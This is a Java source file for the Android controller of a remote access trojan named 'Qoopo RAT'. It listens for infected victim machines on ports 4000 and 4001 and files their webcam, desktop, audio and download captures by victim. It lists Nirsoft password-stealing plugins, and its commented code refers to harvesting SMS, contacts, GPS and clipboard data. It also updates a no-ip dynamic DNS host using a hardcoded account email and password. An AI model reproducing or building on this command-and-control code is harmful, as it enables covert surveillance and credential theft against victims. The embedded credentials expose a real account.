package qooporat.android;
import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
//import qoopo.rat.android.R;
import qooporat.android.utilidades.Perfil;
import qooporat.utilidades.Compresor;
import qooporat.utilidades.Configuracion;
import qooporat.utilidades.NoIpService;
import qooporat.utilidades.Protocolo;
import qooporat.utilidades.cifrado.Encriptacion;

public class QoopoRAT extends Activity {

    private boolean cargarPlugin = false;
    public static HashMap<String, Servidor> servidores = new HashMap();
//    ------------------------------------------------------------------------    
//    ------------------------------------------------------------------------
//    public static String[] nombresPluginsNirsoft = 
//            new String[]{"bpv","dialupass", "mailpv", "netpass", "netpass64", "pspv", "wbpv", "astlog", "mspass", "wireless", "wireless64"};
    public static String[] nombresPluginsNirsoft
            = new String[]{"bpv", "dialupass", "mailpv", "netpass", "netpass64", "pspv", "mspass", "wireless", "wireless64", "wbpv", "wb"};
    public static String[] nombresLibs
            = new String[]{"JMapViewer"};
    private List<Conexion> listaConexiones;
    private List<ConexionArchivos> listaConexionesarchivos;
    //    ------------------------------------------------------------------------
    private List<Perfil> perfiles;
    private boolean escuchando = false;
    private Configuracion config;
    // el servidor seleccionado
    private String serverSeleccionado = "";

    /**
     * Called when the activity is first created.
     *
     * @param savedInstanceState
     */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("qooporat", "onCreate");
        setContentView(R.layout.main);
        crearPerfiles();
        actualizarNoIp();
        this.ConectaoDesconectaPuerto();
    }

    @Override
    protected void onDestroy() {
        Log.d("qooporat", "OnDestroy");
        super.onDestroy(); //To change body of generated methods, choose Tools | Templates.
    }

    @Override
    protected void onPause() {
        Log.d("qooporat", "onPause");
        super.onPause(); //To change body of generated methods, choose Tools | Templates.
    }

    @Override
    protected void onStart() {
        Log.d("qooporat", "OnStart");
        super.onStart(); //To change body of generated methods, choose Tools | Templates.
    }

    public void ponerEstado(String mensaje) {
        Log.i("qooporat", mensaje);
//        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
//        this.txtLog.append(sdf.format(new Date()) + ">" + mensaje + "\n");
//        this.txtLog.setCaretPosition(txtLog.getDocument().getLength());
    }

    public void autenticar(Servidor servidor) {
        this.ponerEstado("Autenticando con nuevo servidor [" + servidor.getIp() + "]");
        for (Perfil p : this.perfiles) {
            servidor.enviarComando(Protocolo.autenticar, Encriptacion.MD5(p.getPassword()));
        }
    }

    private void agregarServidor(Servidor serv) {
//        synchronized (this.tabla) {
        Object[] datos = new Object[12];
//            datos[0] = serv.getVistaPreviaEscritorio();
        datos[1] = serv.getIdentificador();
        datos[2] = serv.getDatos()[0];
        datos[3] = "" + serv.getTiempoVida();
        datos[4] = "" + serv.getDatos()[2];
        datos[5] = "" + serv.getDatos()[3];
        datos[6] = "" + serv.getUsuario();
        datos[7] = "" + serv.getDatos()[5];
        datos[8] = "" + serv.getDatos()[6];
        datos[9] = "" + serv.getDatos()[7];
        datos[10] = "" + serv.getDatos()[8];
        datos[11] = "" + serv.getDatos()[9];
//            getModelotabla().addRow(datos);
        QoopoRAT.servidores.put(serv.getIdentificador(), serv);
//            File ds = new File("servidores", serv.getIdentificador());
        File ds = new File("servidores", serv.getUsuario() + "_" + serv.getHost());
//        if (!ds.exists()) {
//            ds.mkdir();
//        }
        File da = new File(ds, "audio");
//        if (!da.exists()) {
//            da.mkdir();
//        }
        File dw = new File(ds, "descargas");
//        if (!dw.exists()) {
//            dw.mkdir();
//        }
        File di = new File(ds, "imagenes");
//        if (!di.exists()) {
//            di.mkdir();
//        }
        File dwc = new File(di, "webcam");
//        if (!dwc.exists()) {
//            dwc.mkdir();
//        }
        File dwe = new File(di, "escritorio");
//        if (!dwe.exists()) {
//            dwe.mkdir();
//        }
        serv.setdPrincipal(ds);
        serv.setdDescargas(dw);
        serv.setdImagenes(di);
        serv.setdWebCam(dwc);
        serv.setdEscritorio(dwe);
        serv.setdAudio(da);
//            if (this.chkVistaPrevia.isSelected()) {
        serv.pedirPantallaMiniatura();
//            }
        QoopoRAT.this.ponerEstado("Se conecto servidor: (" + serv.getInformacion() + ")");
//            mostrarNotificacion(serv);
//        }
    }

    public void actualizarDatosServidor(Servidor serv) {
        boolean encontrado = false;
//        synchronized (this.tabla) {
//            for (int i = 0; i < tabla.getRowCount(); i++) {
//                String seleccionado = this.tabla.getValueAt(i, 1).toString();
//                String seleccionado = getModelotabla().getValueAt(i, 1).toString();
//                if (seleccionado.equals(serv.getIdentificador())) {
//                    getModelotabla().setValueAt(serv.getVistaPreviaEscritorio(), i, 0);
//                    getModelotabla().setValueAt(serv.getTiempoVida(), i, 3);
//                    encontrado = true;
//                }
//            }
        if (!encontrado) {
            this.agregarServidor(serv);
        }
//            if (this.serverSeleccionado.equals(serv.getIdentificador())) {
//                mostrarMiniatura(serv);
//            }
//        QoopoRAT.this.ventana.setTitle("Qoopo RAT [" + QoopoRAT.servidores.size() + " usuarios conectados]");
    }

    public void eliminarServidor(Servidor serv) {
//        Camara wC = QoopoRAT.capturasWebCam.get(serv.getIdentificador());
//        EscritorioRemoto eR = QoopoRAT.capturasEscritorio.get(serv.getIdentificador());
//        AdminArchivos aA = QoopoRAT.administradoresArchivos.get(serv.getIdentificador());
//        Microfono mic = QoopoRAT.capturasAudio.get(serv.getIdentificador());
//        Passwords pass = QoopoRAT.passwords.get(serv.getIdentificador());
//        Mapa mapa = QoopoRAT.capturasGPS.get(serv.getIdentificador());
//        Contactos contacto = QoopoRAT.contactos.get(serv.getIdentificador());
//        SMSListar smsListar = QoopoRAT.sms.get(serv.getIdentificador());
//        Informacion info = QoopoRAT.informacion.get(serv.getIdentificador());
//        ClipBoard clipboard = QoopoRAT.portapapeles.get(serv.getIdentificador());
//        Procesos procesosVentana = QoopoRAT.procesos.get(serv.getIdentificador());
//        Conexiones conexionesVentana = QoopoRAT.conexiones.get(serv.getIdentificador());
//        Chat vChat = QoopoRAT.ventanasChat.get(serv.getIdentificador());
//        ArchivosOffline venOffline = QoopoRAT.ventanasOffline.get(serv.getIdentificador());
//        try {
//            venOffline.dispose();
//        } catch (Exception e) {
//        }
//        try {
//            wC.dispose();
//        } catch (Exception e) {
//        }
//        try {
//            eR.dispose();
//        } catch (Exception e) {
//        }
//        try {
//            aA.dispose();
//        } catch (Exception e) {
//        }
//        try {
//            mic.dispose();
//        } catch (Exception e) {
//        }
//        try {
//            pass.dispose();
//        } catch (Exception e) {
//        }
//        try {
//            mapa.dispose();
//        } catch (Exception e) {
//        }
//        try {
//            contacto.dispose();
//        } catch (Exception e) {
//        }
//        try {
//            smsListar.dispose();
//        } catch (Exception e) {
//        }
//        try {
//            info.dispose();
//        } catch (Exception e) {
//        }
//        try {
//            clipboard.dispose();
//        } catch (Exception e) {
//        }
//        try {
//            procesosVentana.dispose();
//        } catch (Exception e) {
//        }
//        try {
//            conexionesVentana.dispose();
//        } catch (Exception e) {
//        }
//        try {
//            vChat.dispose();
//        } catch (Exception e) {
//        }
//        QoopoRAT.servidores.remove(serv.getIdentificador());
//        QoopoRAT.capturasEscritorio.remove(serv.getIdentificador());
//        QoopoRAT.capturasWebCam.remove(serv.getIdentificador());
//        QoopoRAT.administradoresArchivos.remove(serv.getIdentificador());
//        QoopoRAT.capturasAudio.remove(serv.getIdentificador());
//        QoopoRAT.passwords.remove(serv.getIdentificador());
//        QoopoRAT.capturasGPS.remove(serv.getIdentificador());
//        QoopoRAT.contactos.remove(serv.getIdentificador());
//        QoopoRAT.sms.remove(serv.getIdentificador());
//        QoopoRAT.portapapeles.remove(serv.getIdentificador());
//        QoopoRAT.informacion.remove(serv.getIdentificador());
//        QoopoRAT.procesos.remove(serv.getIdentificador());
//        QoopoRAT.conexiones.remove(serv.getIdentificador());
//        QoopoRAT.ventanasOffline.remove(serv.getIdentificador());
//        try {
//            for (int i = 0; i <= modelotabla.getRowCount(); i++) {
//                String id = this.modelotabla.getValueAt(i, 1).toString();
//                if (id.equals(serv.getIdentificador())) {
//                    this.modelotabla.removeRow(i);
//                }
//            }
//        } catch (Exception e) {
////            e.printStackTrace();
//        }
//        try {
//            if (serverSeleccionado.equals(serv.getIdentificador())) {
//                mostrarMiniatura(null);
//            }
//        } catch (Exception e) {
//        }
//        QoopoRAT.this.ventana.setTitle("Qoopo RAT [" + QoopoRAT.servidores.size() + " usuarios conectados]");
    }

    public byte[] comprimirObjecto(Object objeto) {
        byte[] bytes = null;
        ObjectOutputStream objectOut = null;
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            objectOut = new ObjectOutputStream(baos);
            objectOut.writeObject(objeto);
            objectOut.close();
            bytes = Compresor.comprimirGZIP(baos.toByteArray());
        } catch (IOException ex) {
        } finally {
            try {
                objectOut.close();
            } catch (IOException ex) {
            }
        }
        return bytes;
    }

    public Object descomprimirObjeto(byte[] bytes) {
        ObjectInputStream objectIn = null;
        try {
            ByteArrayInputStream bais = new ByteArrayInputStream(Compresor.descomprimirGZIP(bytes));
            objectIn = new ObjectInputStream(bais);
            return (Object) objectIn.readObject();
        } catch (IOException ex) {
        } catch (ClassNotFoundException ex) {
        } finally {
            try {
                if (objectIn != null) {
                    objectIn.close();
                }
            } catch (IOException ex) {
            }
        }
        return null;
    }

    private void crearPerfiles() {
        perfiles = new ArrayList<Perfil>();
        Perfil perfil = new Perfil();
        perfil.setPuerto1("4000");
        perfil.setPuerto2("4001");
        perfil.setPassword("1234");
        perfiles.add(perfil);
    }

    public void ConectaoDesconectaPuerto() {
        List<String> puertosUsados = new ArrayList<String>();
        ponerEstado("iniciando conecta o desconecta " + escuchando);
        if (!escuchando) {
            this.listaConexiones = new ArrayList<Conexion>();
            this.listaConexionesarchivos = new ArrayList<ConexionArchivos>();
            if (perfiles != null && !perfiles.isEmpty()) {
                ponerEstado("lo perfiles si tiene info");
                for (Perfil p : this.perfiles) {
                    ponerEstado("voy a configurar el perfil " + p.getPuerto1());
                    try {
                        if (!puertosUsados.contains(p.getPuerto1())) {
                            Conexion c1 = new Conexion(Integer.valueOf(p.getPuerto1()), 100, this);
                            c1.start();
                            if (!listaConexiones.contains(c1)) {
                                listaConexiones.add(c1);
                            }
                            puertosUsados.add(p.getPuerto1());
                            this.ponerEstado("Esperando conexiones en el puerto [" + p.getPuerto1() + "]");
                        }
                    } catch (Exception ex) {
                        this.ponerEstado("No se puede abrir el puerto [" + p.getPuerto1() + "]");
//                        Logger.getLogger(QoopoRAT.class.getName()).log(Level.SEVERE, null, ex);
                    }
                    try {
                        if (!puertosUsados.contains(p.getPuerto2())) {
                            ConexionArchivos c2 = new ConexionArchivos(Integer.valueOf(p.getPuerto2()), 100, this);
                            c2.start();
                            if (!listaConexionesarchivos.contains(c2)) {
                                listaConexionesarchivos.add(c2);
                            }
                            puertosUsados.add(p.getPuerto2());
                            this.ponerEstado("Esperando conexiones en el puerto [" + p.getPuerto2() + "]");
                        }
                    } catch (Exception ex) {
                        this.ponerEstado("No se puede abrir el puerto [" + p.getPuerto2() + "]");
//                        Logger.getLogger(QoopoRAT.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
                escuchando = true;
//                btnIniciar.setText("Detener");
//                btnIniciar.setIcon(new ImageIcon(getClass().getResource("/resources/stop_close.png")));
            } else {
                ponerEstado("No hay perfiles creados. ");
//                JOptionPane.showConfirmDialog(null, "No hay perfiles creados. Debe crear un perfil en la Interfaz \"Crear Servidor\"");
//                JOptionPane.showMessageDialog(null, "No hay perfiles creados. Debe crear un perfil en la Interfaz \"Crear Servidor\"");
            }
        } else {
            synchronized (QoopoRAT.servidores) {
                for (Servidor serv : QoopoRAT.servidores.values()) {
                    serv.DETENER();
                }
            }
            for (Conexion c : this.listaConexiones) {
                c.stopPara();
            }
            for (ConexionArchivos c : this.listaConexionesarchivos) {
                c.stopPara();
            }
            this.listaConexiones = new ArrayList<Conexion>();
            this.listaConexionesarchivos = new ArrayList<ConexionArchivos>();
            escuchando = false;
//            btnIniciar.setText("Iniciar");
//            btnIniciar.setIcon(new ImageIcon(getClass().getResource("/resources/start.png")));
        }
    }

    public void actualizarNoIp() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                NoIpService m = new NoIpService("beto.garcia.dk@gmail.com", "t4ed6palberto");
                String re = m.actualiza("qoopo.ddns.net", "");
                ponerEstado("Respuesta NO-IP:" + re);
            }
        }).start();
    }
}
